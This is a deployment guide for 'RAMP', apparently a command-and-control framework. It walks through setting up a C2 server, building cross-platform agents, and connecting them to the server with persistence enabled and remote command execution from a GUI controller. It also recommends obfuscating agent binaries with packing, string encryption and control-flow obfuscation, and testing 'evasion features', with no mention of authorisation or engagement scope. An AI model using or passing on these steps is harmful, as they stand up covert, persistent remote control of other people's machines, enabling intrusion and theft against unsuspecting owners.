# RAMP Deployment Guide

## Prerequisites

### Server Requirements
- **OS**: Ubuntu 22.04 LTS (recommended) or Windows Server
- **CPU**: 2+ cores
- **RAM**: 4GB minimum, 8GB recommended
- **Storage**: 20GB+
- **Network**: Public IP address, Port 443 open

### Software Requirements
- Python 3.11+
- Redis
- Go 1.21+ (for building agents)
- Node.js 18+ (for GUI controller)
- Docker (optional, recommended)

## Step 1: Generate SSL Certificates

```bash
cd tools
python ssl_gen.py --cn "your-domain.com" --output ../c2-server/certs
```

**Important**: Save the SHA256 fingerprint for agent certificate pinning!

## Step 2: Configure C2 Server

### Option A: Docker Deployment (Recommended)

```bash
cd c2-server

# Set environment variables
export ADMIN_PASSWORD="your-secure-password"
export JWT_SECRET_KEY="your-secret-key"

# Build and run
docker build -t ramp-c2 .
docker run -d \
  -p 8443:8443 \
  -e ADMIN_PASSWORD=$ADMIN_PASSWORD \
  -e JWT_SECRET_KEY=$JWT_SECRET_KEY \
  -v $(pwd)/certs:/app/certs \
  -v $(pwd)/uploads:/app/uploads \
  --name ramp-c2 \
  ramp-c2
```

### Option B: Manual Deployment

```bash
cd c2-server

# Install dependencies
pip install -r requirements.txt

# Start Redis (if not running)
sudo systemctl start redis

# Set environment variables
export ADMIN_PASSWORD="your-secure-password"
export JWT_SECRET_KEY="your-secret-key"

# Run with gunicorn
gunicorn --bind 0.0.0.0:8443 \
  --certfile=certs/server.crt \
  --keyfile=certs/server.key \
  --workers=4 \
  app:app
```

### Cloud Deployment (AWS Example)

```bash
# 1. Create EC2 instance (Ubuntu 22.04, t3.medium)

#2. SSH into instance
ssh ubuntu@your-instance-ip

# 3. Install Docker
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh

# 4. Clone repository and deploy
git clone <your-repo-url>
cd RAMP/c2-server

# 5. Configure and run (see Docker deployment above)

# 6. Configure security group to allow port 8443
```

## Step 3: Build Agents

### Windows
```cmd
cd scripts
build_agent.bat
```

### Linux/macOS
```bash
cd scripts
chmod +x build_agent.sh
./build_agent.sh
```

Agents will be in `dist/` directory.

## Step 4: Configure Agents

Edit agent config or provide via command line:

```bash
# Interactive (will prompt for C2 server)
./ramp-agent-windows-amd64.exe

# Command line
./ramp-agent-windows-amd64.exe --server your-server.com:8443

# With certificate pinning
# Create config.json:
{
  "c2_server": "your-server.com:8443",
  "certificate_pin": "sha256-fingerprint-from-step-1",
  "enable_persistence": true
}

./ramp-agent-windows-amd64.exe --config config.json
```

## Step 5: Deploy GUI Controller

```bash
cd gui-controller

# Install dependencies
npm install

# Development mode
npm start

# Build for production
npm run build:win  # Windows
npm run build:mac  # macOS
npm run build:linux # Linux
```

Installers will be in `gui-controller/dist/`

## Step 6: First Connection

1. Start GUI Controller
2. Enter C2 server URL: `https://your-server.com:8443`
3. Click "Connect"
4. Deploy an agent on a test system
5. Wait for agent check-in (appears in Agents view)

## Step 7: Verification

### Check C2 Server Health
```bash
curl -k https://your-server.com:8443/health
```

### Check Agent Connection
- Go to Agents view in GUI
- Refresh agents list
- Verify agent appears with correct details

### Test Command Execution
1. Select an agent in Agents view
2. Click "Command"
3. Enter test command: `whoami`
4. Verify output appears

## Security Hardening

### C2 Server

1. **Use Strong Credentials**
```bash
export ADMIN_PASSWORD=$(openssl rand -base64 32)
export JWT_SECRET_KEY=$(openssl rand -base64 64)
```

2. **Enable IP Whitelisting**
```bash
export IP_WHITELIST="your-admin-ip,another-allowed-ip"
```

3. **Use Firewall**
```bash
sudo ufw allow 8443/tcp
sudo ufw enable
```

4. **SSL Best Practices**
- Use Let's Encrypt for production
- Enable HSTS headers
- Disable weak ciphers

### Agent Deployment

1. **Use Certificate Pinning**
   - Always pin C2 server certificate
   - Prevents MITM attacks

2. **Obfuscate Binaries** (optional)
   - Use UPX packing
   - String encryption
   - Control flow obfuscation

3. **Test in VM First**
   - Verify functionality
   - Check evasion features
   - Monitor behavior

## Maintenance

### Update C2 Server
```bash
cd c2-server
git pull
docker build -t ramp-c2 .
docker stop ramp-c2
docker rm ramp-c2
# Run new container (see Step 2)
```

### Rotate Credentials
```bash
# Generate new JWT secret
export JWT_SECRET_KEY=$(openssl rand -base64 64)

# Restart C2 server
# All controllers will need to re-authenticate
```

### Monitor Logs
```bash
# Docker
docker logs -f ramp-c2

# Manual deployment
tail -f /var/log/ramp-c2.log
```

## Troubleshooting

### Agent Won't Connect
- Check firewall rules
- Verify C2 server is running: `curl -k https://server:8443/health`
- Check certificate pinning fingerprint
- Review agent logs

### GUI Controller Connection Failed
- Verify HTTPS URL format: `https://server:8443`
- Accept self-signed certificate warning
- Check network connectivity
- Verify C2 server is accessible

### Redis Connection Errors
```bash
# Check Redis status
sudo systemctl status redis

# Restart Redis
sudo systemctl restart redis
```

## Production Checklist

- [ ] SSL certificates generated (or Let's Encrypt configured)
- [ ] Strong passwords set for all services
- [ ] IP whitelisting configured
- [ ] Firewall rules applied
- [ ] Agents tested in staging environment
- [ ] Monitoring configured
- [ ] Backup strategy implemented
- [ ] Incident response plan documented

## Support

For issues or questions:
- Review documentation
- Check logs for errors
- Test in isolated environment
- Verify all prerequisites met
